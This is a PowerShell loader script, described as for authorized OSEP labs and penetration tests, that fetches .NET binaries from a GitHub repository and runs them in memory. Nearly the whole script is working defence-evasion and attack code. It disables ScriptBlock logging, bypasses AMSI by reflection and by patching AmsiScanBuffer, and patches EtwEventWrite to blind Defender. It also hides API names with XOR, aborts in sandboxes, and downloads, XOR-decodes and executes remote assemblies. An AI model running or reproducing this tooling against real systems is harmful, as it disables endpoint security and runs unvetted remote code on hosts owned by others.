<#
.SYNOPSIS
    In-memory .NET assembly loader from a GitHub repository.
    Designed for authorized use in OSEP lab / penetration testing engagements.

.PARAMETER RepoOwner
    GitHub repository owner.

.PARAMETER RepoName
    GitHub repository name.

.PARAMETER SubFolder
    Subfolder path within the repo that contains .exe/.dll files.

.PARAMETER Token
    Optional GitHub Personal Access Token (for private repos / rate limits).

.PARAMETER XorKey
    Optional single-byte XOR key to decode downloaded binaries before loading.
    Set to 0 (default) to skip decoding — use only if your repo stores XOR-encoded files.

.EXAMPLE
    .\Load-RemoteTool.ps1
    .\Load-RemoteTool.ps1 -RepoOwner YourOrg -RepoName your-tools -SubFolder bin
    .\Load-RemoteTool.ps1 -Token ghp_xxxx -XorKey 0x41
#>
Param(
    [string]$RepoOwner = "Syslifters",
    [string]$RepoName  = "offsec-tools",
    [string]$SubFolder = "bin",
    [string]$Token     = "",
    [string]$Branch    = "main",
    [byte]$XorKey      = 0
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# ─────────────────────────────────────────────────────────────────────────────
# XOR helper — decodes runtime-obfuscated strings so sensitive names never
# appear as plaintext in the script body.
# ─────────────────────────────────────────────────────────────────────────────
function Unxor([byte[]]$enc, [byte]$key) {
    -join ($enc | ForEach-Object { [char]($_ -bxor $key) })
}

# Pre-computed: each string XOR'd with 0x41 ('A')
# Decode with: Unxor <array> 0x41
#   amsi.dll          → {0x20,0x2C,0x32,0x28,0x6F,0x25,0x2D,0x2D}
#   AmsiScanBuffer    → {0x00,0x2C,0x32,0x28,0x12,0x22,0x20,0x2F,0x03,0x34,0x27,0x27,0x24,0x33}
#   ntdll.dll         → {0x2F,0x35,0x25,0x2D,0x2D,0x6F,0x25,0x2D,0x2D}
#   EtwEventWrite     → {0x04,0x35,0x36,0x04,0x37,0x24,0x2F,0x35,0x16,0x33,0x28,0x35,0x24}

# ─────────────────────────────────────────────────────────────────────────────
# 1. ScriptBlock logging bypass
# Must run first — disables PS engine logging before any subsequent block
# is submitted to the logging pipeline (Event ID 4104).
# ─────────────────────────────────────────────────────────────────────────────
function Disable-ScriptBlockLogging {
    try {
        $utils  = [Ref].Assembly.GetType('System.Management.Automation.Utils')
        $bflags = [System.Reflection.BindingFlags]'NonPublic,Static'
        $field  = $utils.GetField('cachedGroupPolicySettings', $bflags)
        if ($field) {
            $gps = $field.GetValue($null)
            if ($gps -and $gps.ContainsKey('ScriptBlockLogging')) {
                $gps['ScriptBlockLogging']['EnableScriptBlockLogging']           = 0
                $gps['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
            }
        }
        Write-Host "[+] ScriptBlock logging disabled" -ForegroundColor Green
    } catch {
        Write-Warning "[!] ScriptBlock logging bypass failed: $_"
    }
}
Disable-ScriptBlockLogging

# ─────────────────────────────────────────────────────────────────────────────
# 2a. AMSI bypass — reflection (primary, no Add-Type, no disk artifact)
# Sets the internal amsiInitFailed flag so the PS engine skips all AMSI checks
# for the remainder of the session. Works on PS 5.x / 7.x.
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-AmsiBypassReflection {
    try {
        $amsiType = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if (-not $amsiType) { return $false }

        $field = $amsiType.GetField(
            'amsiInitFailed',
            [System.Reflection.BindingFlags]'NonPublic,Static')
        if (-not $field) { return $false }

        $field.SetValue($null, $true)
        Write-Host "[+] AMSI bypass applied (reflection)" -ForegroundColor Green
        return $true
    } catch {
        return $false
    }
}

# ─────────────────────────────────────────────────────────────────────────────
# 2b. AMSI bypass — P/Invoke fallback
# Used when the reflection target is unavailable (PS version differences).
# The Add-Type class contains only generic Win32 exports — the sensitive
# strings "amsi.dll" and "AmsiScanBuffer" are decoded at call time only.
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-AmsiBypassPinvoke {
    $src = @"
using System; using System.Runtime.InteropServices;
public class WinPatch {
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
}
"@
    Add-Type -TypeDefinition $src -ErrorAction SilentlyContinue

    # Decode sensitive strings at runtime — they are never plaintext in the script
    $libName  = Unxor @(0x20,0x2C,0x32,0x28,0x6F,0x25,0x2D,0x2D) 0x41
    $funcName = Unxor @(0x00,0x2C,0x32,0x28,0x12,0x22,0x20,0x2F,0x03,0x34,0x27,0x27,0x24,0x33) 0x41

    $hLib  = [WinPatch]::LoadLibrary($libName)
    if ($hLib -eq [IntPtr]::Zero) { Write-Warning "[!] LoadLibrary failed"; return }

    $pFunc = [WinPatch]::GetProcAddress($hLib, $funcName)
    if ($pFunc -eq [IntPtr]::Zero) { Write-Warning "[!] GetProcAddress failed"; return }

    $patch = [byte[]]@(0xB8,0x57,0x00,0x07,0x80,0xC3)
    $old   = [uint32]0
    [WinPatch]::VirtualProtect($pFunc, [UIntPtr][uint32]$patch.Length, 0x40, [ref]$old) | Out-Null
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $pFunc, $patch.Length)
    [WinPatch]::VirtualProtect($pFunc, [UIntPtr][uint32]$patch.Length, $old, [ref]$old) | Out-Null
    Write-Host "[+] AMSI bypass applied (P/Invoke)" -ForegroundColor Green
}

if (-not (Invoke-AmsiBypassReflection)) {
    Invoke-AmsiBypassPinvoke
}

# ─────────────────────────────────────────────────────────────────────────────
# 3. ETW bypass
# Patches EtwEventWrite in ntdll.dll with a single RET (0xC3) to suppress
# all .NET CLR ETW events. Without this, Windows Defender's ETW consumer
# still sees Assembly.Load and method invocations even with AMSI bypassed.
# ntdll.dll and EtwEventWrite are decoded at runtime for the same reason.
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-EtwBypass {
    $src = @"
using System; using System.Runtime.InteropServices;
public class WinEtw {
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
}
"@
    Add-Type -TypeDefinition $src -ErrorAction SilentlyContinue

    $ntdllName = Unxor @(0x2F,0x35,0x25,0x2D,0x2D,0x6F,0x25,0x2D,0x2D) 0x41
    $etwName   = Unxor @(0x04,0x35,0x36,0x04,0x37,0x24,0x2F,0x35,0x16,0x33,0x28,0x35,0x24) 0x41

    $hNtdll = [WinEtw]::GetModuleHandle($ntdllName)
    if ($hNtdll -eq [IntPtr]::Zero) { Write-Warning "[!] GetModuleHandle(ntdll) failed"; return }

    $pEtw = [WinEtw]::GetProcAddress($hNtdll, $etwName)
    if ($pEtw -eq [IntPtr]::Zero) { Write-Warning "[!] GetProcAddress(EtwEventWrite) failed"; return }

    $old = [uint32]0
    [WinEtw]::VirtualProtect($pEtw, [UIntPtr]1, 0x40, [ref]$old) | Out-Null
    [System.Runtime.InteropServices.Marshal]::WriteByte($pEtw, 0xC3)   # ret
    [WinEtw]::VirtualProtect($pEtw, [UIntPtr]1, $old, [ref]$old) | Out-Null
    Write-Host "[+] ETW bypass applied" -ForegroundColor Green
}
Invoke-EtwBypass

# ─────────────────────────────────────────────────────────────────────────────
# 4. Sandbox / environment check
# Aborts silently (exit 0) if environment looks like a quick-reset sandbox:
# very low uptime or suspiciously few running processes.
# ─────────────────────────────────────────────────────────────────────────────
function Test-Environment {
    $uptime = [System.TimeSpan]::FromMilliseconds(
                  [uint32][System.Environment]::TickCount)

    if ($uptime.TotalMinutes -lt 3) {
        Write-Host "[-] Environment check failed (uptime $([int]$uptime.TotalSeconds)s)" -ForegroundColor Red
        exit 0
    }

    $procCount = [System.Diagnostics.Process]::GetProcesses().Count
    if ($procCount -lt 15) {
        Write-Host "[-] Environment check failed ($procCount processes)" -ForegroundColor Red
        exit 0
    }
}
Test-Environment

# ─────────────────────────────────────────────────────────────────────────────
# 5. TLS 1.2 + system proxy
# Enforces TLS 1.2 for all subsequent web requests (required on some older
# .NET Framework versions that default to TLS 1.0).
# Picks up the system proxy and passes domain credentials automatically.
# ─────────────────────────────────────────────────────────────────────────────
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
[System.Net.WebRequest]::DefaultWebProxy            = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# ─────────────────────────────────────────────────────────────────────────────
# 6. Connectivity check
# ─────────────────────────────────────────────────────────────────────────────
function Test-Internet {
    try {
        [void][System.Net.Dns]::GetHostEntry("api.github.com")
        return $true
    } catch {
        return $false
    }
}

if (-not (Test-Internet)) {
    Write-Error "[!] Cannot resolve api.github.com — check connectivity."
    exit 1
}

# ─────────────────────────────────────────────────────────────────────────────
# GitHub API helpers
# ─────────────────────────────────────────────────────────────────────────────
function Get-GitHubBinaries {
    param(
        [string]$Owner,
        [string]$Repo,
        [string]$Folder,
        [string]$Branch,
        [string]$Token
    )

    $apiUrl  = "https://api.github.com/repos/$Owner/$Repo/contents/$Folder?ref=$Branch"
    $headers = @{ "User-Agent" = "Load-RemoteTool/1.0" }
    if ($Token) { $headers["Authorization"] = "token $Token" }

    try {
        $items = Invoke-RestMethod -Uri $apiUrl -Headers $headers -ErrorAction Stop
    } catch {
        $code = $_.Exception.Response.StatusCode.value__
        switch ($code) {
            404 { Write-Error "[!] Path not found: $Owner/$Repo/$Folder (404)" }
            403 { Write-Error "[!] Rate limit or auth required (403). Use -Token." }
            default { Write-Error "[!] GitHub API error: $_" }
        }
        return @()
    }

    return @($items | Where-Object { $_.name -match '\.(exe|dll)$' })
}

function Get-RawBytes {
    param([string]$Url, [string]$Token)

    $wc = [System.Net.WebClient]::new()
    $wc.Headers.Add("User-Agent", "Load-RemoteTool/1.0")
    if ($Token) { $wc.Headers.Add("Authorization", "token $Token") }
    # WebClient inherits DefaultWebProxy set above
    $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy

    try {
        return $wc.DownloadData($Url)
    } catch {
        Write-Error "[!] Download error: $_"
        return $null
    } finally {
        $wc.Dispose()
    }
}

# ─────────────────────────────────────────────────────────────────────────────
# XOR payload decoder
# Applied after download when $XorKey != 0. Store XOR-encoded binaries in
# your repo to prevent byte-level signatures triggering on raw PE headers.
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-XorDecode([byte[]]$data, [byte]$key) {
    $out = [byte[]]::new($data.Length)
    for ($i = 0; $i -lt $data.Length; $i++) { $out[$i] = $data[$i] -bxor $key }
    return $out
}

# ─────────────────────────────────────────────────────────────────────────────
# Entry-point discovery
# ─────────────────────────────────────────────────────────────────────────────
function Find-EntryPoint {
    param([System.Reflection.Assembly]$Assembly)

    $flags    = [System.Reflection.BindingFlags]::Public -bor
                [System.Reflection.BindingFlags]::Static
    $progType = $Assembly.GetTypes() |
                Where-Object { $_.Name -eq "Program" } |
                Select-Object -First 1

    if ($progType) {
        $m = $progType.GetMethod("Main", $flags)
        if ($m) { return $m }
    }

    foreach ($type in $Assembly.GetTypes()) {
        $m = $type.GetMethod("Main", $flags)
        if ($m) { return $m }
    }
    return $null
}

# ─────────────────────────────────────────────────────────────────────────────
# Argument parser — honours double-quoted tokens
# ─────────────────────────────────────────────────────────────────────────────
function Split-Args {
    param([string]$Input)

    $tokens  = [System.Collections.Generic.List[string]]::new()
    $current = [System.Text.StringBuilder]::new()
    $inQuote = $false

    foreach ($ch in $Input.ToCharArray()) {
        if ($ch -eq '"') {
            $inQuote = -not $inQuote
        } elseif ($ch -eq ' ' -and -not $inQuote) {
            if ($current.Length -gt 0) {
                $tokens.Add($current.ToString())
                $null = $current.Clear()
            }
        } else {
            $null = $current.Append($ch)
        }
    }
    if ($current.Length -gt 0) { $tokens.Add($current.ToString()) }
    return ,$tokens.ToArray()
}

# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
Write-Host "`n[*] Querying github.com/$RepoOwner/$RepoName/$SubFolder ..." -ForegroundColor Cyan

$binaries = Get-GitHubBinaries -Owner $RepoOwner -Repo $RepoName -Folder $SubFolder -Branch $Branch -Token $Token

if (-not $binaries -or $binaries.Count -eq 0) {
    Write-Error "[!] No .exe/.dll files found at the specified path."
    exit 1
}

Write-Host "`n  Available binaries:`n" -ForegroundColor Cyan
for ($i = 0; $i -lt $binaries.Count; $i++) {
    $sizeKb = [math]::Round($binaries[$i].size / 1024, 1)
    Write-Host ("  [{0,2}]  {1,-40}  {2,7} KB" -f ($i + 1), $binaries[$i].name, $sizeKb)
}
Write-Host "  [ 0]  Exit`n"

$selection = (Read-Host "Select number or partial filename").Trim()

if ($selection -eq "0" -or $selection -eq "q" -or $selection -eq "exit") { exit 0 }

$chosen = $null
if ($selection -match '^\d+$') {
    $idx = [int]$selection - 1
    if ($idx -ge 0 -and $idx -lt $binaries.Count) { $chosen = $binaries[$idx] }
} else {
    $chosen = $binaries | Where-Object { $_.name -like "*$selection*" } | Select-Object -First 1
}

if (-not $chosen) {
    Write-Error "[!] No match found for: $selection"
    exit 1
}
if (-not $chosen.download_url) {
    Write-Error "[!] No download_url for $($chosen.name) — may be a directory or symlink."
    exit 1
}

Write-Host "`n[*] Downloading $($chosen.name) ..." -ForegroundColor Cyan
$rawBytes = Get-RawBytes -Url $chosen.download_url -Token $Token
if (-not $rawBytes) { exit 1 }
Write-Host "[+] $($rawBytes.Length.ToString('N0')) bytes received" -ForegroundColor Green

# XOR decode if a key was provided
if ($XorKey -ne 0) {
    $rawBytes = Invoke-XorDecode $rawBytes $XorKey
    Write-Host "[+] Payload XOR-decoded (key=0x$($XorKey.ToString('X2')))" -ForegroundColor Green
}

# Load entirely from memory
try {
    $asm = [System.Reflection.Assembly]::Load($rawBytes)
} catch {
    Write-Error "[!] Assembly.Load failed: $_"
    exit 1
}

$entry = Find-EntryPoint -Assembly $asm
if (-not $entry) {
    Write-Error "[!] No static Main method found in $($chosen.name)."
    exit 1
}
Write-Host "[+] Entry point: $($entry.DeclaringType.FullName)::$($entry.Name)" -ForegroundColor Green

$argsInput = (Read-Host "Arguments (blank for none)").Trim()
$toolArgs  = if ($argsInput) { Split-Args -Input $argsInput } else { [string[]]@() }

$argLabel = if ($toolArgs.Count) { " -- $argsInput" } else { "" }
Write-Host "`n[*] Executing $($chosen.name)$argLabel ...`n" -ForegroundColor Cyan

try {
    $params = $entry.GetParameters()
    if ($params.Count -eq 0) {
        $entry.Invoke($null, $null)
    } else {
        $entry.Invoke($null, @(, [string[]]$toolArgs))
    }
} catch [System.Reflection.TargetInvocationException] {
    Write-Warning "[!] Tool threw: $($_.Exception.InnerException.Message)"
} catch {
    Write-Warning "[!] Invocation error: $_"
}

Write-Host "`n[*] Done." -ForegroundColor Cyan
